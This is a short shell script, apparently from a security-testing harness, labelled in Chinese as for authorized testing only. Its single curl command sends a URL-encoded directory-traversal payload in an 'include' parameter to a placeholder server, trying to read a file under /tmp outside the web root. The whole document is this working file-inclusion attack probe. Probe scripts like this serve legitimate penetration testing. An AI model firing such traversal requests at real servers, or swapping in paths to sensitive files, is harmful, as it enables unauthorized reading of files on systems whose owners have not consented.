#!/usr/bin/env sh
set -eu
# 仅限授权测试；替换 TARGET 后手动执行
curl -sS -i -X ANY 'http://TARGET:8080/021?include=..%2F..%2F..%2F..%2Ftmp%2Fsunset_GEN11054.txt'
